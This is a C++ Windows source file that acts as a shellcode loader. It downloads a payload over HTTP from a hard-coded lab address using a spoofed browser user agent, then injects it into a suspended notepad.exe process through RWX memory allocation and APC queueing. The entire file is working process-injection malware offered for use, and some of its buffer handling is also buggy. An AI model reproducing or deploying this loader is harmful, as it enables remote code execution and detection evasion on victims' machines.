#include <Windows.h>
#include <iostream>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

BOOL xCreateProcess(IN LPSTR _Process, OUT LPPROCESS_INFORMATION ProcessInfo, IN LPVOID scLocation);
BOOL xFetchShellcode(IN LPCWSTR Server, IN DWORD Port, IN LPCWSTR PayloadURI, OUT LPVOID* scLocation, OUT ULONG* scSize);

int main(int argc, char* argv[]) {

	LPVOID remoteAddr = NULL;
	LPVOID scLocation				= NULL;
	ULONG scSize					= 0;
	PROCESS_INFORMATION processinfo = { 0 };
	SIZE_T bytesWritten				= 0;

	RtlSecureZeroMemory( &processinfo, sizeof(PROCESS_INFORMATION));

	xFetchShellcode(L"192.168.47.128", 8000, L"/shellcode", &scLocation, &scSize);
	
	printf("[*] Location of shellcode from remote server\n\t> @ %#p\n", scLocation);
	printf("[*] Shellcode size: %d\n", scSize);

	xCreateProcess((LPSTR)"C:\\Windows\\System32\\notepad.exe", &processinfo, scLocation);
	
	printf("[*] Process ID: %d\n", processinfo.dwProcessId);

	remoteAddr = VirtualAllocEx(processinfo.hProcess, NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Remote address of shellcode @ %#p", remoteAddr);

	if (!WriteProcessMemory(processinfo.hProcess, remoteAddr, scLocation, scSize, &bytesWritten)) {
		printf("[-] Cant write shellcode\n");
		RtlSecureZeroMemory(scLocation, scSize);
		RtlSecureZeroMemory(remoteAddr, scSize);
	}
	else {
		printf("[!] Shellcode copied\n");
	}
	
	if (!QueueUserAPC((PAPCFUNC)remoteAddr, processinfo.hThread, 0)) {
		printf("[-] Failed to queue thread for shellcode execution\n");
		RtlSecureZeroMemory(scLocation, scSize);
		RtlSecureZeroMemory(remoteAddr, scSize);
		return -100;
	}

	printf("[+] Thread resumed for shellcode execution\n");
	ResumeThread(processinfo.hThread);

	return 0;

}

BOOL xCreateProcess(IN LPSTR _Process, OUT LPPROCESS_INFORMATION _ProcessInfo, IN LPVOID scLocation) {

	BOOL ret = FALSE;

	STARTUPINFOA StartupInfo = { 0 };;

	RtlSecureZeroMemory( &StartupInfo, sizeof (STARTUPINFOA));
	RtlSecureZeroMemory( _ProcessInfo, sizeof (PROCESS_INFORMATION));

	if (!CreateProcessA(NULL, _Process, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, _ProcessInfo)) {
		printf("[-] Failed to create suspended process -> %d\n", GetLastError());
		return -99;
	}
	else {
		printf("[+] Process created in suspended mode\n");
		ret = TRUE;
	}

	return ret;
}

BOOL xFetchShellcode(IN LPCWSTR Server, IN DWORD Port, IN LPCWSTR PayloadURI, OUT LPVOID* scLocation, OUT ULONG* scSize) {

	BOOL ret = FALSE;

	LPVOID buffer[4096*12];
	RtlSecureZeroMemory(buffer, sizeof(buffer));
	
	ULONG http_data		= { 0 };
	ULONG scLength		= { 0 };
	LPVOID heapMemory	= NULL;
	HINTERNET hHTTP		= { 0 };
	HINTERNET hConnect	= { 0 };
	HINTERNET hRequest	= { 0 };
	WCHAR HttpMethod[]	= { 'G','E','T', NULL };
	LPCWSTR userAgent	= L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\0";
	HANDLE hProcHeap	= GetProcessHeap();

	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
	// WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 
	// WINHTTP_ACCESS_TYPE_NO_PROXY
	if ( ! ( hHTTP = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0 ) ) ) {
		printf("[-] Failed to create a WinHTTP session \n");
		goto CLEANUP;
	}
	else {
		printf("Session: %#p\n", hHTTP);
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
	if ( ! ( hConnect = WinHttpConnect( hHTTP, Server, Port, 0 ) ) ) {
		printf("[-] Failed to open HTTPS connection \n");
		goto CLEANUP;
	}
	else {
		printf("Connect: %#p\n", hConnect);
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
	if ( ! ( hRequest = WinHttpOpenRequest(
		hConnect, 
		HttpMethod,
		PayloadURI, 
		NULL, 
		WINHTTP_NO_REFERER, 
		WINHTTP_DEFAULT_ACCEPT_TYPES, 
		WINHTTP_FLAG_BYPASS_PROXY_CACHE //+ WINHTTP_FLAG_SECURE // Uncomment to allow for HTTPS comms
	) ) ) {

		printf("[-] Failed to create handle for HTTPS request \n");
		goto CLEANUP;
	}
	else {
		printf("Request: %#p\n", hRequest);
	}


	if ( ! WinHttpSendRequest(
		hRequest, 
		WINHTTP_NO_ADDITIONAL_HEADERS, 
		0, 
		NULL, 
		0, 
		0, 
		NULL ) ) {

		printf("[-] Failed to send the HTTPS request -> %ld\n", GetLastError());
		goto CLEANUP;
	}
	else {
		printf("[+] HTTPS request send to remote server\n");
	}

	if (! WinHttpReceiveResponse(hRequest, 0)) {
		printf("[-] Failed to send the HTTPS request -> %ld\n", GetLastError());
		goto CLEANUP;
	}
	else {
		printf("[+] HTTPS response received from remote server\n");
	}

	while (!ret) {

		ret = WinHttpReadData(hRequest, buffer, sizeof(buffer), &http_data);
		if ( ret == FALSE || http_data == 0 ) {
			break;
		}

		if ( ! heapMemory) {
			if (! ( heapMemory = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, http_data))) {
				printf("[-] Failed allocated memory for shellcode\n");
				printf("[!] Trying to reallocate memory...\n");
			}
			else {
				printf("[+] Memory allocated for shellcode @ %#p\n", heapMemory);
			}
		} else {
			if (! ( heapMemory = HeapReAlloc(hProcHeap, HEAP_ZERO_MEMORY, *buffer, http_data + scLength ) ) ) {
				printf("[-] Failed to reallocate memory for shellcode\n");
				RtlSecureZeroMemory( buffer, sizeof(buffer) );
				goto CLEANUP;
			}
			else {
				printf("[+] Memory reallocated for shellcode @ %#p\n", heapMemory );
			}
		}

		memcpy( heapMemory, buffer, http_data );
		RtlSecureZeroMemory( buffer, sizeof(buffer) );

		scLength += http_data;
	}

	*scLocation = heapMemory;
	*scSize		= http_data;

	ret = TRUE;

CLEANUP:
	if ( hHTTP )		WinHttpCloseHandle( hHTTP );
	if ( hConnect )		WinHttpCloseHandle( hConnect );
	if ( hRequest )		WinHttpCloseHandle( hRequest );

	return ret;
}